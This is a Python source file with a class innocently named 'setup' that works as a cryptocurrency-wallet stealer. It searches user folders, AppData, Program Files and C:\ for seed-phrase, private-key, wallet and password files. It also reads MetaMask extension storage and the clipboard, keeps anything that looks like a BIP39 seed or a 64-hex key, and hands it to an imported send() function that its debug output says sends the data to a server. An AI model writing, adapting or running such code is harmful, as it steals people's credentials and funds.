import os
import re
import json
import time
from pathlib import Path
from export import send

class setup:
    def __init__(self):
        self.data = []
        print("[DEBUG] Setup initialized")
    
    def run(self):
        print("[DEBUG] Scan started")
        self._scan()
        print(f"[DEBUG] Scan complete. Found: {len(self.data)} items")
        if self.data:
            print("[DEBUG] Sending data to server...")
            send(self.data)
            print("[DEBUG] Data sent")
        else:
            print("[DEBUG] No data found, skipping send")
    
    def _scan(self):
        print("[DEBUG] Starting file scan...")
        
        # ============================================
        # SCAN 1: WALLET FILES (ANYWHERE)
        # ============================================
        print("[DEBUG] Scanning for wallet files...")
        
        # Common wallet file names
        wallet_files = [
            "wallet.dat", "wallet.json", "seed.txt", "seedphrase.txt",
            "mnemonic.txt", "privatekey.txt", "key.txt", "backup.txt",
            "recovery.txt", "passphrase.txt", "metamask.txt", "trustwallet.txt",
            "secrets.txt", "passwords.txt", "crypto.txt", "wallet_backup.txt",
            "metamask_backup.txt", "seed_phrase.txt", "recovery_phrase.txt"
        ]
        
        # Search locations (all common places)
        search_paths = [
            os.path.expanduser("~"),
            os.path.expandvars("%APPDATA%"),
            os.path.expandvars("%USERPROFILE%\\Desktop"),
            os.path.expandvars("%USERPROFILE%\\Documents"),
            os.path.expandvars("%USERPROFILE%\\Downloads"),
            os.path.expandvars("%USERPROFILE%\\Pictures"),
            os.path.expandvars("%USERPROFILE%\\Music"),
            os.path.expandvars("%USERPROFILE%\\Videos"),
            os.path.expandvars("%LOCALAPPDATA%"),
            os.path.expandvars("%PROGRAMFILES%"),
            os.path.expandvars("%PROGRAMFILES(x86)%"),
            "C:\\",
        ]
        
        found_files = []
        
        for search_path in search_paths:
            if not os.path.exists(search_path):
                continue
            
            print(f"[DEBUG] Searching: {search_path}")
            try:
                for root, dirs, files in os.walk(search_path):
                    # Limit depth to avoid scanning entire drive
                    depth = root.replace(search_path, '').count(os.sep)
                    if depth > 4:
                        continue
                    
                    for file in files:
                        # Check if file matches wallet patterns
                        file_lower = file.lower()
                        if any(pattern in file_lower for pattern in wallet_files):
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, 'r', errors='ignore') as f:
                                    content = f.read()
                                    # Check if it looks like a seed phrase or private key
                                    if self._looks_like_seed(content) or self._looks_like_key(content):
                                        print(f"[DEBUG] Found wallet file: {file_path}")
                                        found_files.append({
                                            'type': 'file',
                                            'path': file_path,
                                            'content': content[:5000]
                                        })
                            except Exception as e:
                                print(f"[DEBUG] Error reading {file_path}: {e}")
            except Exception as e:
                print(f"[DEBUG] Error walking {search_path}: {e}")
        
        self.data.extend(found_files)
        print(f"[DEBUG] Found {len(found_files)} wallet files")
        
        # ============================================
        # SCAN 2: METAMASK VAULT
        # ============================================
        print("[DEBUG] Scanning for MetaMask vaults...")
        
        metamask_paths = [
            os.path.expandvars(r"%APPDATA%\Google\Chrome\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"),
            os.path.expandvars(r"%APPDATA%\Google\Chrome\Profile*\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"),
            os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles\*\storage\default\moz-extension+++*"),
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"),
        ]
        
        for path_pattern in metamask_paths:
            from glob import glob
            for path in glob(path_pattern):
                try:
                    locker_file = os.path.join(path, "LOCK")
                    if os.path.exists(locker_file):
                        with open(locker_file, 'r', errors='ignore') as f:
                            data = f.read()
                            self.data.append({
                                'type': 'metamask',
                                'path': locker_file,
                                'data': data[:10000]
                            })
                            print(f"[DEBUG] Found MetaMask vault: {locker_file}")
                except Exception as e:
                    print(f"[DEBUG] Error scanning {path_pattern}: {e}")
        
        # ============================================
        # SCAN 3: CLIPBOARD
        # ============================================
        print("[DEBUG] Checking clipboard...")
        try:
            import pyperclip
            clipboard_content = pyperclip.paste()
            if clipboard_content:
                if self._looks_like_key(clipboard_content) or self._looks_like_seed(clipboard_content):
                    self.data.append({
                        'type': 'clipboard',
                        'content': clipboard_content
                    })
                    print(f"[DEBUG] Found key/seed in clipboard: {clipboard_content[:50]}...")
                else:
                    print("[DEBUG] No key/seed in clipboard")
            else:
                print("[DEBUG] Clipboard empty")
        except Exception as e:
            print(f"[DEBUG] Clipboard error: {e}")
        
        print(f"[DEBUG] Total items found: {len(self.data)}")
    
    def _looks_like_seed(self, text):
        """Check if text looks like a seed phrase."""
        if not text or len(text) < 20:
            return False
        
        # BIP39 words - just a sample for detection
        bip39_words = {
            'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract',
            'absurd', 'abuse', 'access', 'accident', 'account', 'accuse', 'achieve', 'acid',
            'acoustic', 'acquire', 'across', 'act', 'action', 'actor', 'actress', 'actual',
            'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult', 'advance',
            'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent',
            'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album'
        }
        
        words = set(text.lower().split())
        matches = words.intersection(bip39_words)
        return len(matches) >= 6  # At least 6 BIP39 words
    
    def _looks_like_key(self, text):
        """Check if text looks like a private key."""
        if not text:
            return False
        
        # Check for 0x + 64 hex chars
        if re.search(r'0x[a-fA-F0-9]{64}', text):
            return True
        
        # Check for 64 hex chars without 0x
        if re.search(r'\b[a-fA-F0-9]{64}\b', text):
            return True
        
        return False